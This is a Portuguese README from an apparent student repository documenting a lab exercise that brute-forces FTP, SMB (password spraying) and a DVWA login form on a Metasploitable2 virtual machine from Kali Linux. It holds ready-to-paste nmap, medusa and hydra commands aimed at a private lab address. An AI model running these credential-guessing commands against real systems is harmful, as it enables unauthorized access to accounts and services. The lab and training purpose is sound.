# desafio-medusa-kali
# Desafio: Brute Force com Medusa e Kali Linux

**Autor:** Paulo Henrique  
**Data:** 2025-11-04

---

## Descrição

Usei máquinas virtuais: instalei **Kali Linux** (atacante) e **Metasploitable2** (alvo) para realizar testes de força bruta em FTP, SMB e formulários web. O objetivo deste repositório é documentar o processo, os comandos e o que aprendi.

---

## Ambiente

- VirtualBox 
- Kali Linux — máquina atacante (ex.: `192.168.56.100`)  
- Metasploitable2 — máquina alvo (ex.: `192.168.56.101`)  
- Ferramentas: `medusa`, `hydra`, `nmap`, `smbclient`, `crunch`

---

## Estrutura do repositório

```
desafio_medusa/
├─ README.md        ← este arquivo
├─ report.md        ← relato simples
├─ commands.txt     ← comandos prontos
├─ users.txt
└─ /wordlists
   ├─ simple.txt
   └─ spray.txt
```

---

## Comandos básicos (copiar/colar)

### Enumeração
```bash
nmap -sC -sV -T4 192.168.56.101 -oN nmap_initial.txt
```

### FTP com Medusa
```bash
medusa -h 192.168.56.101 -u msfadmin -P ~/wordlists/simple.txt -M ftp -t 8 | tee medusa_ftp_output.txt
```

### SMB (password spraying) com Medusa
```bash
medusa -h 192.168.56.101 -U users.txt -P ~/wordlists/spray.txt -M smbnt -t 8 | tee medusa_smb_output.txt
```

### DVWA (form) com Hydra
```bash
hydra -l admin -P ~/wordlists/simple.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=Location" -t 6
```

---

## O que aprendi (resumo)

- Sempre começar por **enumeração** (`nmap`) para identificar serviços.  
- `Medusa` é bom pra protocolos que aceitam autenticação direta (FTP, SMB com módulos disponíveis).  
- `Hydra` é mais prático para **form-based logins**.  
- `Password spraying` tenta poucas senhas em muitos usuários para evitar lockout.  
- Documentar comandos e validar manualmente é essencial.

---

## Observações importantes

- **Nunca** execute esses testes em sistemas sem autorização.

---

## Próximos passos (sugestões)

- Substituir wordlists por listas mais direcionadas ao contexto.  
- Testar ferramentas complementares (CrackMapExec, Impacket).  
- Implementar um pequeno script para analisar logs e detectar password spraying.

---

## Licença

Uso educacional e de aprendizado.
